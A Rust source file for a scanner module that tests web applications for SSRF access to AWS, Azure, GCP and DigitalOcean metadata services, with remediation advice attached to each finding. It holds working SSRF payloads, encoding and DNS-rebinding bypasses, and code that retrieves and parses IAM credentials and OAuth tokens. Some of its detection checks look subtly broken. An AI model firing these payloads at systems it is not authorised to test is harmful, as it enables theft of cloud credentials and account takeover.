//! Cloud Metadata Service Scanner
//!
//! Detects cloud metadata service exposure and SSRF vulnerabilities leading to:
//! - AWS IMDS (Instance Metadata Service) v1/v2
//! - Azure Instance Metadata Service
//! - Google Cloud Metadata Service
//! - DigitalOcean Metadata Service
//! - Cloudflare Workers metadata
//! - IAM credentials extraction
//! - Internal service discovery via metadata
//!
//! References:
//! - AWS IMDS: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
//! - Azure: https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
//! - GCP: https://cloud.google.com/compute/docs/metadata/overview
//! - SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

#![allow(dead_code)]

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use regex::Regex;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;

/// Metadata endpoints for various cloud providers
const AWS_METADATA_HOST: &str = "169.254.169.254";
const AZURE_METADATA_HOST: &str = "169.254.169.254";
const GCP_METADATA_HOST: &str = "metadata.google.internal";
const DIGITALOCEAN_METADATA_HOST: &str = "169.254.169.254";

/// Timeout for metadata requests (metadata services should respond quickly)
const METADATA_TIMEOUT: Duration = Duration::from_secs(3);

/// Maximum size for metadata response
const MAX_METADATA_SIZE: usize = 1024 * 100; // 100KB

/// Cloud provider identifiers
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CloudProvider {
    Aws,
    Azure,
    Gcp,
    DigitalOcean,
    Cloudflare,
    Unknown,
}

impl CloudProvider {
    pub fn name(&self) -> &str {
        match self {
            CloudProvider::Aws => "AWS",
            CloudProvider::Azure => "Azure",
            CloudProvider::Gcp => "Google Cloud Platform",
            CloudProvider::DigitalOcean => "DigitalOcean",
            CloudProvider::Cloudflare => "Cloudflare Workers",
            CloudProvider::Unknown => "Unknown",
        }
    }
}

/// AWS IMDS version detected
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AwsImdsVersion {
    V1, // Vulnerable to SSRF
    V2, // Session token required (more secure)
    Both,
    None,
}

/// Metadata exposure result
#[derive(Debug, Clone)]
pub struct MetadataExposure {
    pub provider: CloudProvider,
    pub endpoint: String,
    pub accessible: bool,
    pub imds_version: Option<AwsImdsVersion>,
    pub credentials_exposed: bool,
    pub userdata_exposed: bool,
    pub findings: Vec<String>,
}

/// Extracted IAM credentials
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IamCredentials {
    pub access_key_id: Option<String>,
    pub secret_access_key: Option<String>,
    pub token: Option<String>,
    pub expiration: Option<String>,
    pub role_name: Option<String>,
}

pub struct CloudMetadataScanner {
    client: Client,
    config: ScannerConfig,
}

impl CloudMetadataScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = METADATA_TIMEOUT;
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(2))
            .build()
            .expect("Failed to create HTTP client for metadata scanning");

        Self { client, config }
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Try to inject metadata endpoint URLs via SSRF
        report.merge(self.test_metadata_ssrf(url).await?);

        // Aggressive mode: more thorough testing
        if self.config.aggressive {
            report.merge(self.test_advanced_metadata_exposure(url).await?);
            report.merge(self.test_metadata_service_discovery(url).await?);
        }

        Ok(report)
    }

    /// Test SSRF payloads targeting cloud metadata services
    async fn test_metadata_ssrf(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Common SSRF injection points
        let ssrf_params = &["url", "dest", "redirect", "uri", "path", "file", "feed", "fetch"];

        // AWS IMDSv1 endpoints (most critical)
        let aws_endpoints = &[
            "/latest/meta-data/",
            "/latest/meta-data/iam/",
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/iam/security-credentials/dummy",
            "/latest/meta-data/identity-credentials/ec2/",
            "/latest/user-data/",
            "/latest/dynamic/instance-identity/",
            "/latest/meta-data/public-keys/",
            "/latest/meta-data/placement/",
        ];

        // Azure metadata endpoints
        let azure_endpoints = &[
            "/metadata/v1/",
            "/metadata/v1/instance?",
            "/metadata/v1/instance/compute?",
            "/metadata/v1/instance/network?",
            "/metadata/v1/loadbalancer?",
            "/metadata/identity/oauth2/token?",
            "/metadata/attested/document?",
        ];

        // GCP metadata endpoints
        let gcp_endpoints = &[
            "/computeMetadata/v1/",
            "/computeMetadata/v1/instance/",
            "/computeMetadata/v1/instance/attributes/",
            "/computeMetadata/v1/project/",
            "/computeMetadata/v1/project/attributes/",
            "/computeMetadata/v1/instance/service-accounts/",
            "/computeMetadata/v1/instance/service-accounts/default/token?",
        ];

        // DigitalOcean endpoints
        let do_endpoints = &["/metadata/v1.json", "/metadata/v1/"];

        // Test AWS metadata
        for endpoint in aws_endpoints {
            for param in ssrf_params {
                let test_url = format!("{}?{}=http://{}{}", base_url, param, AWS_METADATA_HOST, endpoint);

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if response.status().is_success() {
                        if let Ok(text) = response.text().await {
                            if self.is_aws_metadata_response(&text) {
                                report.merge(self.analyze_aws_exposure(endpoint, &text, base_url, param).await?);
                            }
                        }
                    }
                }
            }
        }

        // Test Azure metadata
        for endpoint in azure_endpoints {
            for param in ssrf_params {
                let test_url = format!("{}?{}=http://{}{}", base_url, param, AZURE_METADATA_HOST, endpoint);

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if response.status().is_success() {
                        if let Ok(text) = response.text().await {
                            if self.is_azure_metadata_response(&text) {
                                report.add_finding(Vuln {
                                    severity: VulnSeverity::High,
                                    title: "Azure Metadata Service Exposure via SSRF".to_string(),
                                    description: format!(
                                        "Azure Instance Metadata Service is accessible via SSRF on parameter '{}'. \
                                        This exposes instance configuration, network details, and potentially managed identity tokens.",
                                        param
                                    ),
                                    location: Some(format!("{}?{}=http://169.254.169.254{}", base_url, param, endpoint)),
                                    recommendation: Some(
                                        "Block access to 169.254.169.254. Implement strict URL validation. \
                                        Use Network Security Groups to prevent metadata access from application layer.".to_string()
                                    ),
                                    cwe: Some("CWE-918".to_string()),
                                    owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                                });
                            }
                        }
                    }
                }
            }
        }

        // Test GCP metadata
        for endpoint in gcp_endpoints {
            for param in ssrf_params {
                // GCP uses a custom host, but try localhost DNS rebinding
                let test_url = format!("{}?{}=http://{}{}", base_url, param, GCP_METADATA_HOST, endpoint);

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if response.status().is_success() {
                        if let Ok(text) = response.text().await {
                            if self.is_gcp_metadata_response(&text) {
                                report.add_finding(Vuln {
                                    severity: VulnSeverity::High,
                                    title: "GCP Metadata Service Exposure via SSRF".to_string(),
                                    description: format!(
                                        "Google Cloud Metadata Service is accessible via SSRF on parameter '{}'. \
                                        This exposes instance attributes, service account tokens, and project metadata.",
                                        param
                                    ),
                                    location: Some(format!("{}?{}=http://{}{}", base_url, param, GCP_METADATA_HOST, endpoint)),
                                    recommendation: Some(
                                        "Block access to metadata.google.internal. Implement strict URL validation. \
                                        Use VPC Service Controls to restrict metadata access.".to_string()
                                    ),
                                    cwe: Some("CWE-918".to_string()),
                                    owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                                });
                            }
                        }
                    }
                }
            }
        }

        // Test DigitalOcean metadata
        for endpoint in do_endpoints {
            for param in ssrf_params {
                let test_url = format!("{}?{}=http://{}{}", base_url, param, DIGITALOCEAN_METADATA_HOST, endpoint);

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if response.status().is_success() {
                        if let Ok(text) = response.text().await {
                            if self.is_digitalocean_metadata_response(&text) {
                                report.add_finding(Vuln {
                                    severity: VulnSeverity::High,
                                    title: "DigitalOcean Metadata Service Exposure via SSRF".to_string(),
                                    description: format!(
                                        "DigitalOcean Metadata Service is accessible via SSRF on parameter '{}'. \
                                        This exposes droplet configuration, SSH keys, and vendor data.",
                                        param
                                    ),
                                    location: Some(format!("{}?{}=http://169.254.169.254{}", base_url, param, endpoint)),
                                    recommendation: Some(
                                        "Block access to 169.254.169.254. Implement strict URL validation. \
                                        Use cloud firewalls to prevent metadata access.".to_string()
                                    ),
                                    cwe: Some("CWE-918".to_string()),
                                    owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                                });
                            }
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Advanced metadata exposure testing (aggressive mode)
    async fn test_advanced_metadata_exposure(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Test for IMDSv2 token requirement
        report.merge(self.test_aws_imds_version(base_url).await?);

        // Test for credential extraction
        report.merge(self.test_credential_extraction(base_url).await?);

        // Test for userdata exposure
        report.merge(self.test_userdata_exposure(base_url).await?);

        // Test encoding bypasses
        report.merge(self.test_encoding_bypasses(base_url).await?);

        Ok(report)
    }

    /// Test AWS IMDS version (v1 vs v2)
    async fn test_aws_imds_version(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Test IMDSv1 (no token required)
        let imdsv1_urls = &[
            format!("?url=http://{}/latest/meta-data/", AWS_METADATA_HOST),
            format!("?url=http://{}/latest/meta-data/iam/security-credentials/", AWS_METADATA_HOST),
        ];

        let mut imdsv1_vulnerable = false;
        for url_suffix in imdsv1_urls {
            let test_url = format!("{}{}", base_url, url_suffix);
            if let Ok(response) = self.client.get(&test_url).send().await {
                if response.status().is_success() {
                    imdsv1_vulnerable = true;
                }
            }
        }

        if imdsv1_vulnerable {
            report.add_finding(Vuln {
                severity: VulnSeverity::Critical,
                title: "AWS IMDSv1 Exposure via SSRF".to_string(),
                description: "AWS Instance Metadata Service v1 is accessible without session token. IMDSv1 is vulnerable to SSRF attacks as it requires no authentication. An attacker can retrieve IAM credentials and access the cloud environment.".to_string(),
                location: Some(format!("{} via SSRF", base_url)),
                recommendation: Some(
                    "1. Enable IMDSv2 (require session token): hop limit=1\n\
                     2. Block metadata service access at network level\n\
                     3. Use IAM roles for service accounts instead of instance profiles\n\
                     4. Implement strict egress filtering".to_string()
                ),
                cwe: Some("CWE-918".to_string()),
                owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
            });
        }

        // Try to get IMDSv2 token (to test if v2 is enforced)
        let token_url = format!("?url=http://{}/latest/api/token", AWS_METADATA_HOST);
        let test_url = format!("{}{}", base_url, token_url);

        if let Ok(response) = self
            .client
            .put(&test_url)
            .header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
            .send()
            .await
        {
            if response.status().is_success() {
                // IMDSv2 is available, but v1 is still vulnerable
                report.add_finding(Vuln {
                    severity: VulnSeverity::Info,
                    title: "AWS IMDSv2 Available".to_string(),
                    description: "AWS IMDSv2 is detected. IMDSv2 provides better protection against SSRF by requiring session tokens. However, IMDSv1 should be disabled.".to_string(),
                    location: Some(format!("{} via SSRF", base_url)),
                    recommendation: Some("Disable IMDSv1 and enforce IMDSv2 only. Set the instance metadata options to require tokens.".to_string()),
                    cwe: Some("CWE-918".to_string()),
                    owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                });
            }
        }

        Ok(report)
    }

    /// Test for credential extraction via metadata
    async fn test_credential_extraction(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // AWS IAM security credentials endpoints
        let credential_endpoints = &[
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/iam/security-credentials/dummy",
            "/latest/meta-data/identity-credentials/ec2/info",
        ];

        for endpoint in credential_endpoints {
            let test_url = format!("{}?url=http://{}{}", base_url, AWS_METADATA_HOST, endpoint);

            if let Ok(response) = self.client.get(&test_url).send().await {
                if response.status().is_success() {
                    if let Ok(text) = response.text().await {
                        if self.contains_aws_credentials(&text) {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Critical,
                                title: "AWS IAM Credentials Exposed via SSRF".to_string(),
                                description: format!(
                                    "AWS IAM credentials are accessible via metadata service SSRF. \
                                    This includes temporary credentials that can be used to access AWS resources.\n\
                                    Exposed data preview: {}",
                                    self.safe_preview(&text, 200)
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "1. Immediately rotate all exposed IAM credentials\n\
                                     2. Disable IMDSv1, enforce IMDSv2\n\
                                     3. Review IAM policy permissions (principle of least privilege)\n\
                                     4. Enable VPC endpoints for AWS services\n\
                                     5. Block 169.254.169.254 at application layer".to_string()
                                ),
                                cwe: Some("CWE-918".to_string()),
                                owasp: Some("A01:2021 - Broken Access Control".to_string()),
                            });
                        }
                    }
                }
            }
        }

        // Azure managed identity token
        let azure_token_url = format!(
            "{}?url=http://{}/metadata/identity/oauth2/token?api-version=2018-02-01",
            base_url, AZURE_METADATA_HOST
        );

        if let Ok(response) = self
            .client
            .get(&azure_token_url)
            .header("Metadata", "true")
            .send()
            .await
        {
            if response.status().is_success() {
                if let Ok(text) = response.text().await {
                    if text.contains("\"access_token\"") || text.contains("eyJ") {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::Critical,
                            title: "Azure Managed Identity Token Exposed via SSRF".to_string(),
                            description: "Azure managed identity OAuth token is accessible via SSRF. This token can be used to access Azure resources (Key Vault, Storage, SQL, etc.)".to_string(),
                            location: Some(azure_token_url),
                            recommendation: Some(
                                "1. Revoke all exposed managed identity tokens\n\
                                 2. Implement managed identity conditional access policies\n\
                                 3. Block metadata service access from untrusted sources\n\
                                 4. Use Azure Firewall/App Gateway with WAF".to_string()
                            ),
                            cwe: Some("CWE-918".to_string()),
                            owasp: Some("A01:2021 - Broken Access Control".to_string()),
                        });
                    }
                }
            }
        }

        // GCP service account token
        let gcp_token_url = format!(
            "{}?url=http://{}/computeMetadata/v1/instance/service-accounts/default/token",
            base_url, GCP_METADATA_HOST
        );

        if let Ok(response) = self
            .client
            .get(&gcp_token_url)
            .header("Metadata-Flavor", "Google")
            .send()
            .await
        {
            if response.status().is_success() {
                if let Ok(text) = response.text().await {
                    if text.contains("\"access_token\"") || text.contains("ya29.") {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::Critical,
                            title: "GCP Service Account Token Exposed via SSRF".to_string(),
                            description: "Google Cloud service account token is accessible via SSRF. This token can access GCP resources based on the service account's permissions.".to_string(),
                            location: Some(gcp_token_url),
                            recommendation: Some(
                                "1. Revoke the exposed service account token\n\
                                 2. Restrict service account permissions (workload identity)\n\
                                 3. Block metadata.google.internal access\n\
                                 4. Use VPC Service Controls and Private Google Access".to_string()
                            ),
                            cwe: Some("CWE-918".to_string()),
                            owasp: Some("A01:2021 - Broken Access Control".to_string()),
                        });
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test for userdata exposure
    async fn test_userdata_exposure(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        let userdata_endpoints = &[
            ("AWS", format!("?url=http://{}/latest/user-data/", AWS_METADATA_HOST)),
            ("GCP", format!("?url=http://{}/computeMetadata/v1/instance/attributes/", GCP_METADATA_HOST)),
        ];

        for (provider, url_suffix) in userdata_endpoints {
            let test_url = format!("{}{}", base_url, url_suffix);

            if let Ok(response) = self.client.get(&test_url).send().await {
                if response.status().is_success() {
                    if let Ok(text) = response.text().await {
                        if !text.is_empty() && !text.contains("404") && !text.contains("Not Found") {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::High,
                                title: format!("{} Userdata Exposed via SSRF", provider),
                                description: format!(
                                    "{} instance user data is accessible via SSRF. \
                                    User data often contains startup scripts, secrets, or configuration.\n\
                                    Preview: {}",
                                    provider,
                                    self.safe_preview(&text, 150)
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "1. Remove secrets from user data\n\
                                     2. Use secrets management services (AWS Secrets Manager, GCP Secret Manager)\n\
                                     3. Restrict metadata service access\n\
                                     4. Rotate any exposed credentials found in user data".to_string()
                                ),
                                cwe: Some("CWE-918".to_string()),
                                owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                            });
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test encoding bypasses for metadata access
    async fn test_encoding_bypasses(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        let bypasses = &[
            ("URL encoding", "?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"),
            ("Double encoding", "?url=http%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252F"),
            ("Unicode encoding", "?url=http://169.254.169.254/\u{6c}\u{61}\u{74}\u{65}\u{73}\u{74}/\u{6d}\u{65}\u{74}\u{61}-\u{64}\u{61}\u{74}\u{61}/"),
            ("IPv6 localhost", "?url=http://[::1]/latest/meta-data/"),
            ("Decimal IP", "?url=http://2852039166/latest/meta-data/"),
            ("Hex IP", "?url=http://0xA9FEA9FE/latest/meta-data/"),
            ("DNS rebinding", "?url=http://169.254.169.254.evil.com/latest/meta-data/"),
        ];

        for (bypass_type, payload) in bypasses {
            let test_url = format!("{}{}", base_url, payload);

            if let Ok(response) = self.client.get(&test_url).send().await {
                if response.status().is_success() {
                    if let Ok(text) = response.text().await {
                        if self.is_aws_metadata_response(&text) {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::High,
                                title: format!("Metadata SSRF Encoding Bypass: {}", bypass_type),
                                description: format!(
                                    "Cloud metadata service is accessible via SSRF using {} encoding bypass.",
                                    bypass_type
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "Implement proper URL validation and encoding normalization. \
                                    Block all metadata service IP addresses regardless of encoding.".to_string()
                                ),
                                cwe: Some("CWE-918".to_string()),
                                owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                            });
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test for internal service discovery via metadata
    async fn test_metadata_service_discovery(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // AWS dynamic data for network discovery
        let discovery_endpoints = &[
            "/latest/meta-data/local-ipv4",
            "/latest/meta-data/local-hostname",
            "/latest/meta-data/public-ipv4",
            "/latest/meta-data/public-hostname",
            "/latest/meta-data/placement/availability-zone",
            "/latest/meta-data/network/interfaces/macs/",
            "/latest/dynamic/instance-identity/document",
        ];

        for endpoint in discovery_endpoints {
            let test_url = format!("{}?url=http://{}{}", base_url, AWS_METADATA_HOST, endpoint);

            if let Ok(response) = self.client.get(&test_url).send().await {
                if response.status().is_success() {
                    if let Ok(text) = response.text().await {
                        if !text.is_empty() && !text.contains("404") {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Medium,
                                title: "Network Information Disclosure via Metadata SSRF".to_string(),
                                description: format!(
                                    "Internal network information exposed via metadata SSRF at '{}': {}",
                                    endpoint,
                                    self.safe_preview(&text, 100)
                                ),
                                location: Some(test_url),
                                recommendation: Some("Block metadata service access. This information aids in network reconnaissance for further attacks.".to_string()),
                                cwe: Some("CWE-918".to_string()),
                                owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                            });
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Analyze AWS metadata exposure
    async fn analyze_aws_exposure(
        &self,
        endpoint: &str,
        response: &str,
        base_url: &str,
        param: &str,
    ) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        let credentials = self.extract_aws_credentials(response);

        if credentials.is_some() {
            report.add_finding(Vuln {
                severity: VulnSeverity::Critical,
                title: "AWS Metadata Service: IAM Credentials Exposed".to_string(),
                description: format!(
                    "AWS IAM credentials are accessible via SSRF on parameter '{}' at endpoint '{}'. \
                    This exposes temporary AWS credentials that can be used to access cloud resources.",
                    param, endpoint
                ),
                location: Some(format!("{}?{}=http://169.254.169.254{}", base_url, param, endpoint)),
                recommendation: Some(
                    "1. Immediately rotate exposed credentials\n\
                     2. Enable IMDSv2 (enforce session tokens)\n\
                     3. Block 169.254.169.254 at network level\n\
                     4. Implement strict egress filtering\n\
                     5. Review and minimize IAM role permissions".to_string()
                ),
                cwe: Some("CWE-918".to_string()),
                owasp: Some("A01:2021 - Broken Access Control".to_string()),
            });
        } else if endpoint.contains("/latest/meta-data/") {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: "AWS Metadata Service Exposed via SSRF".to_string(),
                description: format!(
                    "AWS Instance Metadata Service is accessible via SSRF on parameter '{}'. \
                    This exposes instance configuration, network details, and potentially IAM credentials.",
                    param
                ),
                location: Some(format!("{}?{}=http://169.254.169.254{}", base_url, param, endpoint)),
                recommendation: Some(
                    "1. Enable IMDSv2 and disable IMDSv1\n\
                     2. Block metadata service access at network level\n\
                     3. Implement strict URL validation\n\
                     4. Use AWS VPC endpoints for internal service access".to_string()
                ),
                cwe: Some("CWE-918".to_string()),
                owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
            });
        }

        Ok(report)
    }

    /// Check if response is AWS metadata
    fn is_aws_metadata_response(&self, text: &str) -> bool {
        let aws_indicators = &[
            "ami-id",
            "ami-launch-index",
            "ami-manifest-path",
            "hostname",
            "iam/security-credentials",
            "instance-id",
            "instance-type",
            "local-hostname",
            "local-ipv4",
            "placement/",
            "public-ipv4",
            "reservation-id",
            "security-groups",
        ];

        let text_lower = text.to_lowercase();
        aws_indicators.iter().any(|&indicator| text_lower.contains(indicator))
    }

    /// Check if response is Azure metadata
    fn is_azure_metadata_response(&self, text: &str) -> bool {
        let azure_indicators = &[
            "\"compute\"",
            "\"network\"",
            "\"location\"",
            "\"name\"",
            "\"resourceGroupName\"",
            "\"subscriptionId\"",
            "\"vmId\"",
            "\"osType\"",
            "Microsoft.Azure",
        ];

        let text_lower = text.to_lowercase();
        azure_indicators.iter().any(|&indicator| text_lower.contains(indicator))
    }

    /// Check if response is GCP metadata
    fn is_gcp_metadata_response(&self, text: &str) -> bool {
        let gcp_indicators = &[
            "project/",
            "instance/",
            "attributes/",
            "service-accounts/",
            "numericProjectId",
            "projectId",
            "zone",
            "instance",
        ];

        let text_lower = text.to_lowercase();
        gcp_indicators.iter().any(|&indicator| text_lower.contains(indicator))
    }

    /// Check if response is DigitalOcean metadata
    fn is_digitalocean_metadata_response(&self, text: &str) -> bool {
        let do_indicators = &[
            "\"droplet_id\"",
            "\"hostname\"",
            "\"vendor_data\"",
            "\"public_keys\"",
            "\"auth_key\"",
            "\"region\"",
            "digitalocean",
            "\"interfaces\"",
        ];

        let text_lower = text.to_lowercase();
        do_indicators.iter().any(|&indicator| text_lower.contains(indicator))
    }

    /// Check if response contains AWS credentials
    fn contains_aws_credentials(&self, text: &str) -> bool {
        // Check for credential patterns
        let text_lower = text.to_lowercase();

        text_lower.contains("accesskeyid")
            || text_lower.contains("\"accesskeyid\"")
            || (text_lower.contains("\"code\"") && text_lower.contains("\"lastupdated\""))
            || (text_lower.contains("\"expiration\"") && text_lower.contains("\"token\""))
            || (text.contains("ASIA") && text.contains("AIDA"))
            || text.len() > 40
                && (text.contains("Code") || text.contains("LastUpdated") || text.contains("Token"))
    }

    /// Extract AWS credentials from response
    fn extract_aws_credentials(&self, text: &str) -> Option<IamCredentials> {
        if !self.contains_aws_credentials(text) {
            return None;
        }

        // Try to parse as JSON
        if let Ok(value) = serde_json::from_str::<serde_json::Value>(text) {
            if let Some(obj) = value.as_object() {
                return Some(IamCredentials {
                    access_key_id: obj.get("AccessKeyId").and_then(|v| v.as_str()).map(String::from),
                    secret_access_key: obj.get("SecretAccessKey").and_then(|v| v.as_str()).map(String::from),
                    token: obj.get("Token").and_then(|v| v.as_str()).map(String::from),
                    expiration: obj.get("Expiration").and_then(|v| v.as_str()).map(String::from),
                    role_name: obj.get("Code").and_then(|v| v.as_str()).map(String::from),
                });
            }
        }

        // Try regex extraction
        let access_key_re = Regex::new(r"(?i)(?:access[\s_]?key[\s_]?id)[\s:=]+([A-Z0-9]{20})").ok()?;
        let secret_re = Regex::new(r"(?i)(?:secret[\s_]?access[\s_]?key)[\s:=]+([A-Za-z0-9/+=]{40})").ok()?;
        let token_re = Regex::new(r"(?i)(?:session[\s_]?token)[\s:=]+([A-Za-z0-9/+=]{200,})").ok()?;

        Some(IamCredentials {
            access_key_id: access_key_re.captures(text).and_then(|c| c.get(1)).map(|m| m.as_str().to_string()),
            secret_access_key: secret_re.captures(text).and_then(|c| c.get(1)).map(|m| m.as_str().to_string()),
            token: token_re.captures(text).and_then(|c| c.get(1)).map(|m| m.as_str().to_string()),
            expiration: None,
            role_name: None,
        })
    }

    /// Get safe preview of sensitive data (truncated)
    fn safe_preview(&self, text: &str, max_len: usize) -> String {
        if text.len() <= max_len {
            text.to_string()
        } else {
            format!("{}... [truncated, {} bytes total]", &text[..max_len], text.len())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = CloudMetadataScanner::new(config);
        // Scanner created successfully
        assert!(true);
        let _ = scanner;
    }

    #[test]
    fn test_cloud_provider_names() {
        assert_eq!(CloudProvider::Aws.name(), "AWS");
        assert_eq!(CloudProvider::Azure.name(), "Azure");
        assert_eq!(CloudProvider::Gcp.name(), "Google Cloud Platform");
    }

    #[test]
    fn test_aws_metadata_detection() {
        let config = ScannerConfig::new();
        let scanner = CloudMetadataScanner::new(config);

        // Test with AWS metadata response
        let aws_response = "ami-id: ami-12345678\ninstance-id: i-1234567890abcdef0\nhostname: ip-10-0-0-1";
        assert!(scanner.is_aws_metadata_response(aws_response));

        // Test with non-metadata response
        let non_aws_response = "<html><body>Not metadata</body></html>";
        assert!(!scanner.is_aws_metadata_response(non_aws_response));
    }

    #[test]
    fn test_azure_metadata_detection() {
        let config = ScannerConfig::new();
        let scanner = CloudMetadataScanner::new(config);

        // Test with Azure metadata response
        let azure_response = r#"{"location": "eastus", "name": "test-vm", "vmId": "12345"}"#;
        assert!(scanner.is_azure_metadata_response(azure_response));

        // Test with non-metadata response
        let non_azure_response = "<html><body>Not metadata</body></html>";
        assert!(!scanner.is_azure_metadata_response(non_azure_response));
    }

    #[test]
    fn test_gcp_metadata_detection() {
        let config = ScannerConfig::new();
        let scanner = CloudMetadataScanner::new(config);

        // Test with GCP metadata response
        let gcp_response = "project/\ninstance/\nattributes/\n";
        assert!(scanner.is_gcp_metadata_response(gcp_response));

        // Test with non-metadata response
        let non_gcp_response = "<html><body>Not metadata</body></html>";
        assert!(!scanner.is_gcp_metadata_response(non_gcp_response));
    }

    #[test]
    fn test_digitalocean_metadata_detection() {
        let config = ScannerConfig::new();
        let scanner = CloudMetadataScanner::new(config);

        // Test with DO metadata response
        let do_response = r#"{"droplet_id": 123456, "hostname": "test-droplet", "region": "nyc1"}"#;
        assert!(scanner.is_digitalocean_metadata_response(do_response));

        // Test with non-metadata response
        let non_do_response = "<html><body>Not metadata</body></html>";
        assert!(!scanner.is_digitalocean_metadata_response(non_do_response));
    }

    #[test]
    fn test_aws_credentials_detection() {
        let config = ScannerConfig::new();
        let scanner = CloudMetadataScanner::new(config);

        // Test with credentials
        let creds_response = r#"{
            "Code": "Success",
            "LastUpdated": "2024-01-01T00:00:00Z",
            "AccessKeyId": "ASIA1234567890ABCDEF",
            "SecretAccessKey": "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJ",
            "Token": "FwoGZXIvYXdzEBYaD...",
            "Expiration": "2024-01-01T01:00:00Z"
        }"#;
        assert!(scanner.contains_aws_credentials(creds_response));

        // Test without credentials
        let no_creds_response = "ami-id: ami-12345678\ninstance-id: i-1234567890abcdef0";
        assert!(!scanner.contains_aws_credentials(no_creds_response));
    }

    #[test]
    fn test_safe_preview() {
        let config = ScannerConfig::new();
        let scanner = CloudMetadataScanner::new(config);

        // Short text
        assert_eq!(scanner.safe_preview("test", 10), "test");

        // Long text
        let long_text = "a".repeat(100);
        let preview = scanner.safe_preview(&long_text, 20);
        assert!(preview.contains("..."));
        assert!(preview.contains("truncated"));
    }
}
